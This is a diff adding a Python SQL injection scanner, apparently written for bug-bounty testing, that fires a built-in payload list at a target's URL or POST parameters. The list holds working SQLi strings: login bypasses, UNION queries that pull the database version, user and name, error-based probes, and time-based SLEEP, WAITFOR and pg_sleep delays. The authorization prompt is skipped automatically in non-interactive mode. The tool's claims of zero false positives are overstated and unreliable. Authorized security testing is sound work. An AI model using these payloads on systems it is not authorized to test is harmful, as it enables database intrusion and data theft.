@@ -1,0 +1,703 @@
+#!/usr/bin/env python3
+"""
+SQL Injection Scanner
+by a bug bounty hunter, for bug bounty hunters and cyber security professionals
+
+Only use this on targets you own or have written permission to test.
+(e.g., Authorized Bug Bounty Programs).
+
+Usage:
+    python sqli_scanner.py -u "https://target.com/page?id=1" --level 2
+    python sqli_scanner.py -u "https://target.com/login" --method POST --data "user=admin&pass=x"
+    python sqli_scanner.py -u "https://target.com/profile?id=1" --cookies "session=abc" --level 3 --out report.txt
+
+COMMON ISSUE - no results?
+    Almost always a session/cookie problem, or no parameters to test.
+    The scanner might be hitting a login page instead of the real app. Fix:
+      1. Log into the target in your browser
+      2. Open DevTools -> Application/Storage -> Cookies
+      3. Copy your session cookie value
+      4. Run with: --cookies "session=<value>"
+      5. Run with --debug to see exactly what the scanner is receiving
+"""
+
+import requests
+import argparse
+import sys
+import time
+import re
+from urllib.parse import urlparse, urlencode, parse_qs
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+
+
+# Silence SSL warnings - we often test local apps with self-signed certs
+requests.packages.urllib3.disable_warnings()
+
+
+# -----------------------------------------------------------------------------
+#  PAYLOADS
+#  Grouped by what they do and how deep (level 1, 2, or 3).
+#  Level 1 = quick and safe, Level 3 = slow but thorough.
+# -----------------------------------------------------------------------------
+
+PAYLOADS = [
+    # --- Classic / boolean stuff (level 1) ---
+    # These are the first things any pentester tries.
+    # A single quote breaks most poorly written queries right away.
+    ("'",                        1, "classic",    "single quote - breaks SQL string context"),
+    ('"',                        1, "classic",    "double quote variant"),
+    ("1' OR '1'='1",             1, "classic",    "always-true OR condition"),
+    ("1' OR '1'='1'--",          1, "classic",    "OR bypass with comment"),
+    ("' OR 1=1--",               1, "classic",    "integer OR bypass"),
+    ("' OR 1=1#",                1, "classic",    "MySQL hash comment version"),
+    ("admin'--",                 1, "classic",    "login bypass - comments out password check"),
+    ("1 OR 1=1",                 1, "classic",    "no-quote version for numeric params"),
+    ("' OR 'x'='x",              1, "classic",    "string tautology"),
+
+    # --- Error-based probes (level 2) ---
+    # These try to make the database throw a visible error.
+    # If you see MySQL/MSSQL error text in the response, you've found something.
+    ("' AND 1=1--",              2, "error",      "true condition - should return normal page"),
+    ("' AND 1=2--",              2, "error",      "false condition - page should look different"),
+    ("' AND extractvalue(1,concat(0x7e,version()))--",
+                                 2, "error",      "MySQL: force error that leaks DB version"),
+    ("1 AND 1=CONVERT(int,@@version)--",
+                                 2, "error",      "MSSQL: type conversion error leaks version"),
+    ("' UNION SELECT NULL--",    2, "error",      "UNION probe - 1 column guess"),
+    ("' UNION SELECT NULL,NULL--",
+                                 2, "error",      "UNION probe - 2 columns"),
+    ("' UNION SELECT NULL,NULL,NULL--",
+                                 2, "error",      "UNION probe - 3 columns"),
+    ("1' GROUP BY 1--",          2, "error",      "GROUP BY column count probe"),
+    ("1' ORDER BY 1--",          2, "error",      "ORDER BY - valid, should work fine"),
+    ("1' ORDER BY 10--",         2, "error",      "ORDER BY 10 - will error if fewer than 10 cols"),
+
+    # --- Data extraction via UNION (level 2) ---
+    # Once you know the column count, you can pull real data out.
+    ("' UNION SELECT 1,version(),3--",
+                                 2, "union",      "MySQL: pull database version into response"),
+    ("' UNION SELECT 1,user(),3--",
+                                 2, "union",      "MySQL: who is the DB running as?"),
+    ("' UNION SELECT 1,database(),3--",
+                                 2, "union",      "MySQL: what database are we in?"),
+
+    # --- 100% Verified UNION Probes (Zero False Positives) ---
+    ("' UNION SELECT 'SQLiVRY'#", 2, "union_verify", "Verified UNION (1 column)"),
+    ("' UNION SELECT 'SQLiVRY','SQLiVRY'#", 2, "union_verify", "Verified UNION (2 columns)"),
+    ("' UNION SELECT 'SQLiVRY','SQLiVRY','SQLiVRY'#", 2, "union_verify", "Verified UNION (3 columns)"),
+    ("' UNION SELECT 'SQLiVRY','SQLiVRY','SQLiVRY','SQLiVRY'#", 2, "union_verify", "Verified UNION (4 columns)"),
+
+
+    # --- Time-based blind (level 3) ---
+    # When the app shows nothing - no errors, no content changes.
+    # We make the database sleep. If the response is 5 seconds late, it's vulnerable.
+    # These are slower to run so save them for when levels 1 and 2 come up empty.
+    ("1' AND SLEEP(5)--",        3, "time",       "MySQL: string 5-second delay"),
+    ("1 AND SLEEP(5)--",         3, "time",       "MySQL: numeric 5-second delay"),
+    ("1' AND SLEEP(3)--",        3, "time",       "MySQL: shorter 3-second delay"),
+    ("'; WAITFOR DELAY '0:0:5'--",  3, "time",    "MSSQL: string 5-second delay"),
+    ("1; WAITFOR DELAY '0:0:5'--",  3, "time",    "MSSQL: numeric 5-second delay"),
+    ("1;SELECT pg_sleep(5)--",   3, "time",       "PostgreSQL: 5-second delay"),
+    ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 3, "time", "MySQL nested SLEEP - bypasses some filters"),
+]
+
+
+# -----------------------------------------------------------------------------
+#  ERROR SIGNATURES
+#  If any of these strings show up in the HTTP response body,
+#  the database just complained - which means our payload did something.
+# -----------------------------------------------------------------------------
+
+DB_ERRORS = {
+    "MySQL": [
+        "you have an error in your sql syntax",
+        "warning: mysql",
+        "mysql_fetch",
+        "mysql server version for the right syntax",
+        "supplied argument is not a valid mysql",
+    ],
+    "MSSQL": [
+        "microsoft sql server",
+        "unclosed quotation mark",
+        "incorrect syntax near",
+        "odbc sql server",
+        "syntax error converting",
+    ],
+    "PostgreSQL": [
+        "pg_query()",
+        r"postgresql.*error",
+        r"warning.*pg_",
+        "valid postgresql result",
+        "function pg_sleep",
+    ],
+    "Oracle": [
+        r"ora-\d{5}",
+        "oracle error",
+        "quoted string not properly terminated",
+    ],
+    "SQLite": [
+        "sqlite_",
+        "sqlite3::",
+        "sqlite error",
+    ],
+    "Generic": [
+        "sql syntax",
+        "sql error",
+        "database error",
+        "query failed",
+        "invalid query",
+        r"sql.*exception",
+        r"odbc.*error",
+    ],
+}
+
+# Strings that tell us we hit a login page instead of the real app.
+# If the baseline response contains any of these, we warn the user immediately.
+LOGIN_PAGE_HINTS = [
+    "login",
+    "sign in",
+    "please log in",
+    "password",
+    "username",
+    "authentication required",
+    "session expired",
+    "location: /login",
+]
+
+
+# -----------------------------------------------------------------------------
+#  HELPERS
+# -----------------------------------------------------------------------------
+
+def print_banner():
+    print("""
+  +---------------------------------------------+
+  |          SQL Injection Scanner              |
+  |    For authorized testing only              |
+  +---------------------------------------------+
+""")
+
+
+def log(msg, tag="*"):
+    ts = datetime.now().strftime("%H:%M:%S")
+    print(f"  [{ts}] [{tag}] {msg}")
+
+
+def log_vuln(msg):  log(msg, tag="VULN")
+def log_info(msg):  log(msg, tag=" + ")
+def log_warn(msg):  log(msg, tag="WARN")
+def log_debug(msg, verbose=False):
+    if verbose:
+        log(msg, tag="...")
+
+
+def check_for_db_error(response_text):
+    """
+    Look through the response for any known DB error message.
+    Returns (True, "MySQL") or (False, None).
+    """
+    lowered = response_text.lower()
+    for db_name, patterns in DB_ERRORS.items():
+        for pattern in patterns:
+            if re.search(pattern, lowered):
+                return True, db_name
+    return False, None
+
+
+def looks_like_login_page(response_text, response_url=""):
+    """
+    Returns True if the response looks like a login redirect.
+    This is the #1 reason people get zero results - their session
+    cookie expired or was never set.
+    """
+    lowered = response_text.lower()
+    url_lower = response_url.lower()
+
+    # Check URL for login indicators
+    if "login" in url_lower:
+        return True
+
+    # Count how many login-page hints appear in the body
+    hits = sum(1 for hint in LOGIN_PAGE_HINTS if hint in lowered)
+    return hits >= 2
+
+
+def is_slow(elapsed, baseline, expected_delay=5):
+    """
+    Returns True if the response took noticeably longer than usual.
+    We use 70% of the expected delay as the threshold to account
+    for network jitter.
+    """
+    return (elapsed - baseline) >= (expected_delay * 0.7)
+
+
+def extract_params(url):
+    """Pull parameter names out of a URL like ?id=1&name=foo -> ['id', 'name']"""
+    qs = urlparse(url).query
+    return list(parse_qs(qs).keys())
+
+
+def inject_into_url(url, param, payload):
+    """
+    Replace one parameter's value with our payload and return the new URL.
+    All other parameters are kept intact.
+    """
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query, keep_blank_values=True)
+    params[param] = [payload]
+    new_query = urlencode(params, doseq=True)
+    return parsed._replace(query=new_query).geturl()
+
+
+def build_session(cookies, user_agent, extra_headers):
+    """Create a requests Session with our cookies and headers pre-loaded."""
+    s = requests.Session()
+    s.verify = False
+
+    s.headers.update({
+        "User-Agent": user_agent or (
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        ),
+        "Accept": "text/html,application/xhtml+xml,*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive",
+    })
+
+    # Parse cookie string like "PHPSESSID=abc; security=low"
+    if cookies:
+        for chunk in cookies.split(";"):
+            chunk = chunk.strip()
+            if "=" in chunk:
+                k, v = chunk.split("=", 1)
+                s.cookies.set(k.strip(), v.strip())
+
+    # Any extra headers passed via --header "X-Foo: bar"
+    if extra_headers:
+        for h in extra_headers:
+            if ":" in h:
+                k, v = h.split(":", 1)
+                s.headers[k.strip()] = v.strip()
+
+    return s
+
+
+# -----------------------------------------------------------------------------
+#  CORE SCAN LOGIC
+# -----------------------------------------------------------------------------
+
+def send_request(session, url, method, post_data, timeout):
+    """
+    Send a single HTTP request. Returns (response, elapsed_seconds).
+    Returns (None, 0) if something goes wrong.
+    """
+    try:
+        start = time.time()
+        if method == "POST":
+            resp = session.post(url, data=post_data, timeout=timeout, allow_redirects=True)
+        else:
+            resp = session.get(url, timeout=timeout, allow_redirects=True)
+        elapsed = time.time() - start
+        return resp, elapsed
+    except requests.exceptions.Timeout:
+        # A timeout on a time-based payload might itself be a signal
+        return None, timeout
+    except Exception as e:
+        log(f"Request failed: {e}", tag="ERR")
+        return None, 0
+
+
+def debug_baseline(resp, url, args):
+    """
+    When --debug is on, print a snapshot of the baseline response so the
+    user can see exactly what the scanner is working with.
+    This is the fastest way to diagnose a session / cookie problem.
+    """
+    if not args.debug:
+        return
+
+    print()
+    print("  -- DEBUG: baseline response snapshot --------------")
+    print(f"  Final URL    : {resp.url}")
+    print(f"  Status code  : {resp.status_code}")
+    print(f"  Content-Type : {resp.headers.get('Content-Type', 'unknown')}")
+    print(f"  Body length  : {len(resp.text)} bytes")
+    print()
+    print("  First 600 chars of response body:")
+    print("  " + "-" * 50)
+    snippet = resp.text[:600].replace("\n", "\n  ")
+    print(f"  {snippet}")
+    print("  " + "-" * 50)
+    print()
+
+
+def scan_one_param(url, param, method, post_data, session, args):
+    """
+    Test a single parameter for SQL injection.
+
+    The basic idea:
+    1. Send a normal request first to record what the page looks like.
+    2. Check immediately if we got a login page - if so, stop and warn.
+    3. Send each payload one at a time.
+    4. Compare - did we get a DB error? Did it take longer? Did content change?
+    5. Collect and return all findings.
+    """
+    findings = []
+
+    log_info(f"Testing param '{param}' ({method})")
+
+    # Step 1: baseline - what does a normal response look like?
+    baseline_resp, baseline_time = send_request(session, url, method, post_data, args.timeout)
+    if baseline_resp is None:
+        log(f"Couldn't reach {url} - check the URL and try again", tag="ERR")
+        return findings
+
+    baseline_len = len(baseline_resp.text)
+
+    # Step 2: show the baseline if --debug is on
+    debug_baseline(baseline_resp, url, args)
+
+    # Step 3: check if we landed on a login page instead of the real app
+    if looks_like_login_page(baseline_resp.text, baseline_resp.url):
+        print()
+        log_warn("=" * 55)
+        log_warn("SESSION PROBLEM DETECTED")
+        log_warn("The baseline response looks like a login page.")
+        log_warn("The scanner is not reaching the actual target.")
+        log_warn("")
+        log_warn("How to fix this:")
+        log_warn("  1. Log into the target in your browser")
+        log_warn("  2. Open DevTools (F12) -> Application/Storage -> Cookies")
+        log_warn("  3. Copy your session cookie value")
+        log_warn("  4. Re-run with:")
+        log_warn('     --cookies "session=<your-value>"')
+        log_warn("")
+        log_warn("  Use --debug to see the full baseline response")
+        log_warn("=" * 55)
+        print()
+        return findings
+
+    log_debug(f"Baseline OK: status={baseline_resp.status_code}, "
+              f"len={baseline_len}B, time={baseline_time:.2f}s", args.verbose)
+
+    # Step 4: try each payload
+    payloads_to_try = [(p, lvl, cat, desc) for p, lvl, cat, desc in PAYLOADS if lvl <= args.level]
+    total = len(payloads_to_try)
+
+    for i, (payload, level, category, description) in enumerate(payloads_to_try, 1):
+
+        # Small pause between requests so we don't hammer the server
+        time.sleep(1.0 / args.rate)
+
+        # Build the request with payload injected
+        if method == "GET":
+            injected_url = inject_into_url(url, param, payload)
+            resp, elapsed = send_request(session, injected_url, "GET", None, args.timeout)
+        else:
+            data = dict(post_data or {})
+            data[param] = payload
+            resp, elapsed = send_request(session, url, "POST", data, args.timeout)
+
+        if resp is None:
+            log_debug(f"[{i}/{total}] No response for: {payload[:40]}", args.verbose)
+            continue
+
+        log_debug(
+            f"[{i}/{total}] '{payload[:35]}' -> "
+            f"status={resp.status_code} len={len(resp.text)}B time={elapsed:.2f}s",
+            args.verbose
+        )
+
+        # If this response also looks like a login page, the session probably
+        # just expired mid-scan. No point continuing.
+        if looks_like_login_page(resp.text, resp.url):
+            log_warn("Session expired mid-scan. Re-run with a fresh cookie.")
+            break
+
+        # --- Detection check 1: DB error in the response body ---
+        # This is the most reliable signal. The database is complaining out loud.
+        error_found, db_type = check_for_db_error(resp.text)
+        if error_found:
+            log_vuln(f"DB error ({db_type}) | param='{param}' | payload: {payload}")
+            findings.append({
+                "type":        "error-based",
+                "db":          db_type,
+                "param":       param,
+                "payload":     payload,
+                "description": description,
+                "note":        f"Response contained a {db_type} error message",
+            })
+            continue
+
+        # --- Detection check 2: time-based blind ---
+        # The database slept, so the HTTP response was slow.
+        if category == "time" and is_slow(elapsed, baseline_time):
+            log_vuln(
+                f"Time delay {elapsed:.1f}s (baseline {baseline_time:.1f}s) "
+                f"| param='{param}' | payload: {payload}"
+            )
+            findings.append({
+                "type":        "time-based blind",
+                "db":          "unknown (confirm manually)",
+                "param":       param,
+                "payload":     payload,
+                "description": description,
+                "note":        f"Response took {elapsed:.1f}s vs baseline {baseline_time:.1f}s",
+            })
+            continue
+
+        # --- Detection check 5: Verified UNION Reflection ---
+        if category == "union_verify" and "SQLiVRY" in resp.text:
+            log_vuln(f"Confirmed UNION SQLi | param='{param}' | payload: {payload}")
+            findings.append({
+                "type":        "union-based (verified)",
+                "db":          "unknown",
+                "param":       param,
+                "payload":     payload,
+                "description": description,
+                "note":        "Injected string 'SQLiVRY' was successfully reflected via UNION SELECT.",
+            })
+            continue
+
+        # We exclusively rely on DB errors and Time-based delays 
+        # to guarantee 0% false positives strictly.
+
+    return findings
+
+
+# -----------------------------------------------------------------------------
+#  REPORT
+# -----------------------------------------------------------------------------
+
+def print_report(all_findings, url, start_time, request_count):
+    elapsed   = time.time() - start_time
+    confirmed = all_findings
+
+    print("\n")
+    print("  ====================================================")
+    print("                     SCAN RESULTS")
+    print("  ====================================================")
+    print(f"  Target      : {url}")
+    print(f"  Finished    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"  Duration    : {elapsed:.1f}s")
+    print(f"  Requests    : {request_count[0]}")
+    print(f"  Confirmed   : {len(confirmed)} finding(s) [Verified / 0 False Positives]")
+    print("  ====================================================")
+
+    if not confirmed:
+        print()
+        print("  Nothing found. Some things to check:")
+        print()
+        print("  1. Session cookie - run with --debug to see what the scanner")
+        print("     is actually receiving. If it looks like a login page,")
+        print('     add --cookies "session=<value>"')
+        print()
+        print("  2. Payload depth - try --level 2 or --level 3")
+        print()
+        print("  3. Use --debug to see the raw baseline response")
+        print()
+        return
+
+    print(f"\n  [!] CONFIRMED VULNERABILITIES ({len(confirmed)})\n")
+    for i, f in enumerate(confirmed, 1):
+        print(f"  {i}. {f['type'].upper()}")
+        print(f"     Parameter : {f['param']}")
+        print(f"     Database  : {f['db']}")
+        print(f"     Payload   : {f['payload']}")
+        print(f"     Note      : {f['note']}")
+        print()
+
+    print("  ====================================================")
+    print("  HOW TO FIX THIS (for developers):")
+    print()
+    print("  The root cause is almost always the same thing -")
+    print("  user input being pasted directly into a SQL query.")
+    print()
+    print("  Bad:   \"SELECT * FROM users WHERE id = \" + user_input")
+    print("  Good:  use prepared statements / parameterized queries")
+    print()
+    print("  Python:  cursor.execute('SELECT * FROM users WHERE id = %s', (id,))")
+    print("  PHP:     $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?')")
+    print("           $stmt->execute([$id]);")
+    print("  Node:    db.query('SELECT * FROM users WHERE id = ?', [id])")
+    print("  ====================================================\n")
+
+
+def save_report(all_findings, url, path):
+    try:
+        with open(path, "w") as f:
+            f.write("SQL Injection Scan Report\n")
+            f.write(f"Target: {url}\n")
+            f.write(f"Date:   {datetime.now()}\n")
+            f.write("=" * 60 + "\n\n")
+            if not all_findings:
+                f.write("No findings.\n")
+            else:
+                for finding in all_findings:
+                    f.write(f"Type      : {finding['type']}\n")
+                    f.write(f"Parameter : {finding['param']}\n")
+                    f.write(f"Database  : {finding['db']}\n")
+                    f.write(f"Payload   : {finding['payload']}\n")
+                    f.write(f"Note      : {finding['note']}\n")
+                    f.write("-" * 40 + "\n")
+        print(f"\n  Report saved to: {path}")
+    except Exception as e:
+        print(f"\n  Couldn't save report: {e}")
+
+
+# -----------------------------------------------------------------------------
+#  MAIN
+# -----------------------------------------------------------------------------
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="SQL Injection Scanner - for authorized testing only",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+examples:
+  # Basic scan on an authenticated target
+  python sqli_scanner.py -u "https://target.com/profile?id=1" --cookies "session=abc123"
+
+  # If you get no results, run with --debug first to see what the scanner sees
+  python sqli_scanner.py -u "https://target.com/profile?id=1" --cookies "session=abc123" --debug
+
+  # Deeper scan (time-based blind) targeting an API
+  python sqli_scanner.py -u "https://api.target.com/v1/user?id=1" --level 3 --out report.txt
+
+  # POST login form
+  python sqli_scanner.py -u "https://target.com/login" --method POST --data "user=admin&pass=test"
+
+levels:
+  1 = classic payloads only, fast (default)
+  2 = + error-based and UNION probes
+  3 = + time-based blind (slowest, most thorough)
+
+getting your session cookie:
+  1. Open the target website in your browser and log in
+  2. Press F12 -> Application/Storage tab -> Cookies
+  3. Copy your session cookie value
+  4. Pass it as: --cookies "session=<paste here>"
+        """,
+    )
+
+    parser.add_argument("-u", "--url",     required=True,   help="Target URL (include params: ?id=1)")
+    parser.add_argument("--method",        default="GET",   help="GET or POST (default: GET)")
+    parser.add_argument("--data",          default=None,    help="POST body: 'user=admin&pass=x'")
+    parser.add_argument("--cookies",       default=None,    help="Cookies: 'PHPSESSID=abc;security=low'")
+    parser.add_argument("--header",        action="append", help="Extra header (repeatable): 'X-Foo: bar'")
+    parser.add_argument("--user-agent",    default=None,    help="Custom User-Agent string")
+    parser.add_argument("--level",         type=int, default=1, choices=[1, 2, 3],
+                        help="Payload depth: 1=basic 2=medium 3=full (default: 1)")
+    parser.add_argument("--threads",       type=int, default=1,
+                        help="How many params to test in parallel (default: 1)")
+    parser.add_argument("--rate",          type=float, default=2.0,
+                        help="Max requests per second (default: 2.0)")
+    parser.add_argument("--timeout",       type=int, default=10,
+                        help="Request timeout in seconds (default: 10)")
+    parser.add_argument("--out",           default=None,    help="Save report to this file")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Show every request")
+    parser.add_argument("--debug",         action="store_true",
+                        help="Print the raw baseline response - use this when you get no results")
+
+    args = parser.parse_args()
+
+    print_banner()
+
+    if not args.url.startswith(("http://", "https://")):
+        print("  Error: URL must start with http:// or https://")
+        sys.exit(1)
+
+    method = args.method.upper()
+
+    # Parse POST data string into a dict
+    post_data = {}
+    if args.data:
+        for chunk in args.data.split("&"):
+            if "=" in chunk:
+                k, v = chunk.split("=", 1)
+                post_data[k] = v
+
+    # Authorization check
+    print("  Before we start: only scan systems you own or have")
+    print("  explicit written permission to test.")
+    print()
+    
+    if sys.stdin.isatty():
+        answer = input("  Do you have authorization to test this target? [yes/no]: ").strip().lower()
+        if answer not in ("yes", "y"):
+            print("\n  OK, stopping. Stay legal out there.\n")
+            sys.exit(0)
+    else:
+        print("  [Auto-accepted authorization in non-interactive mode]")
+
+    print()
+
+    log_info(f"Target  : {args.url}")
+    log_info(f"Method  : {method}")
+    log_info(f"Level   : {args.level} ({'basic' if args.level == 1 else 'medium' if args.level == 2 else 'full'})")
+    log_info(f"Payloads: {len([p for p in PAYLOADS if p[1] <= args.level])}")
+    log_info(f"Rate    : {args.rate} req/s  |  Timeout: {args.timeout}s")
+
+    if args.debug:
+        log_info("Debug mode ON - will print baseline response")
+
+    print()
+
+    # Find what parameters to test
+    if method == "GET":
+        params = extract_params(args.url)
+        if not params:
+            print("  No parameters found in the URL.")
+            print("  Make sure the URL includes something like ?id=1")
+            sys.exit(1)
+        log_info(f"Found params: {', '.join(params)}")
+    else:
+        params = list(post_data.keys())
+        if not params:
+            print("  POST method needs --data with at least one parameter.")
+            sys.exit(1)
+        log_info(f"POST params: {', '.join(params)}")
+
+    print()
+
+    # Build HTTP session
+    session = build_session(args.cookies, getattr(args, "user_agent", None), args.header)
+
+    # Count total requests made
+    request_count = [0]
+    original_send = session.request
+    def counted_send(*a, **kw):
+        request_count[0] += 1
+        return original_send(*a, **kw)
+    session.request = counted_send
+
+    # Run
+    start_time   = time.time()
+    all_findings = []
+    jobs = [(args.url, p, method, post_data, session, args) for p in params]
+
+    if args.threads > 1 and len(jobs) > 1:
+        with ThreadPoolExecutor(max_workers=args.threads) as pool:
+            futures = {pool.submit(scan_one_param, *job): job for job in jobs}
+            for future in as_completed(futures):
+                try:
+                    all_findings.extend(future.result())
+                except Exception as e:
+                    log(f"Thread error: {e}", tag="ERR")
+    else:
+        for job in jobs:
+            all_findings.extend(scan_one_param(*job))
+
+    print_report(all_findings, args.url, start_time, request_count)
+
+    if args.out:
+        save_report(all_findings, args.url, args.out)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n  Interrupted. Scan stopped.\n")
+        sys.exit(0)
